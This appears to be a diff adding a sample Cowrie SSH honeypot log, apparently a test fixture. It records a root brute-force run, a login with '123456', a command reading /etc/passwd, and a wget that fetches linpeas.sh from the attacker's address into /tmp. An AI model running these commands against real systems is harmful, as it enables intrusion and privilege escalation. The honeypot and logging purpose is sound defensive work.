@@ -1,0 +1,10 @@
+{"eventid":"cowrie.session.connect","src_ip":"172.16.167.131","src_port":51210,"dst_ip":"172.28.0.20","dst_port":2222,"session":"a1b2c3d4e5f6","protocol":"ssh","timestamp":"2026-11-21T17:10:01.102Z"}
+{"eventid":"cowrie.login.failed","username":"root","password":"wrongpass1","src_ip":"172.16.167.131","session":"a1b2c3d4e5f6","timestamp":"2026-11-21T17:10:02.115Z"}
+{"eventid":"cowrie.login.failed","username":"root","password":"wrongpass2","src_ip":"172.16.167.131","session":"a1b2c3d4e5f6","timestamp":"2026-11-21T17:10:03.220Z"}
+{"eventid":"cowrie.login.failed","username":"root","password":"wrongpass3","src_ip":"172.16.167.131","session":"a1b2c3d4e5f6","timestamp":"2026-11-21T17:10:04.318Z"}
+{"eventid":"cowrie.login.failed","username":"root","password":"wrongpass4","src_ip":"172.16.167.131","session":"a1b2c3d4e5f6","timestamp":"2026-11-21T17:10:05.412Z"}
+{"eventid":"cowrie.login.failed","username":"root","password":"wrongpass5","src_ip":"172.16.167.131","session":"a1b2c3d4e5f6","timestamp":"2026-11-21T17:10:06.519Z"}
+{"eventid":"cowrie.login.success","username":"root","password":"123456","src_ip":"172.16.167.131","session":"b2c3d4e5f6a7","timestamp":"2026-11-21T17:10:08.104Z"}
+{"eventid":"cowrie.command.input","input":"uname -a && id && cat /etc/passwd","src_ip":"172.16.167.131","session":"b2c3d4e5f6a7","timestamp":"2026-11-21T17:10:10.440Z"}
+{"eventid":"cowrie.command.input","input":"wget http://172.16.167.131:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh","src_ip":"172.16.167.131","session":"b2c3d4e5f6a7","timestamp":"2026-11-21T17:10:14.902Z"}
+{"eventid":"cowrie.login.failed","username":"admin","password":"admin123","src_ip":"185.220.101.45","session":"c3d4e5f6a7b8","timestamp":"2026-11-21T17:10:20.005Z"}
